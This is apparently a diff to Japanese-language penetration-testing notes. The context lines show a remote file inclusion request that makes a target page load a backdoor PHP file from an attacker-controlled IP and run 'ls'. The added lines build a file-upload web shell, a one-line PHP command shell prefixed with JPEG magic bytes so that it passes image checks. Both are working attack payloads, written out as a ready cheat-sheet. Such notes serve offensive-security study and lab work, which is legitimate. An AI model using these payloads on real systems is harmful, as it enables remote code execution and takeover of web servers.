@@ -24,3 +24,10 @@ cat simple-backdoor.php
 # ?>
 curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
 ```
+
+### ファイルアップロード
+```sh
+# マジックナンバー追加
+echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
+echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
+```
